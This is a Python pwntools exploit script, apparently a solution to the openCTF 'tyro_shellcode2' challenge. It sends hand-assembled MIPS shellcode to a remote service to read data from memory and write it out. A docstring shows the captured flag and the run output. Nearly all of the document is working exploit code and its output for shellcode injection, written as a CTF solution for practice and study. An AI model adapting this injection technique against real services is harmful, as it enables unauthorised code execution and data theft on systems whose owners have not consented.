#!/usr/bin/env python

from pwn import *
import sys

'''
  openCTF python ./shellcode2.py 172.31.1.44 1615
[*] For remote: ./shellcode2.py HOST PORT
[+] Opening connection to 172.31.1.44 on port 1615: Done
[*] Addr is at: 0x76fffce0
[*] Switching to interactive mode

itsa_beeet_different_but_stilltheSAME
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
/home/challenge/qemu-wrapper.sh: line 2: 29407 Segmentation fault      
(core dumped) qemu-mips /home/challenge/tyro_shellcode2
[*] Got EOF while reading in interactive
$
'''

def sh():
	a = ('24020fa3').decode('hex')	# v0 = 3
	b = ('24040003').decode('hex')	# a0 = 3
	c = ('24060040').decode('hex')	# a2 = 0x40
	d = ('3c05004a').decode('hex') 	# a1 == addr 0x4a 5cd0
	e = ('34a55cd0').decode('hex')	# a1 == addr
	f = ('0000000c').decode('hex')	# syscall
	g = ('24040001').decode('hex')	# a0 = 3
	h = ('24020fa4').decode('hex')	# v0 = 4004
	i = ('3c05004a').decode('hex')	# a1 = addr
	j = ('34a55cd0').decode('hex')	# a1 = addr
	k = ('24060040').decode('hex')	# a2 = 0x40
	l = ('0000000c').decode('hex')	# syscall

	return a + b + c + d + e + f + g + h + i + j + k + l

def exploit(r):
	r.recvuntil(' ... ')
	addr = int(r.recv(10), 16)
	log.info("Addr is at: " + hex(addr))

	fout = open('shellcode', 'w')
	fout.write(sh())
	fout.close()

	r.send(sh())
	r.interactive()



if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_shellcode1_84536cf714f0c7cc4786bb226f3a866c'])
        print util.proc.pidof(r)
        pause()
        exploit(r)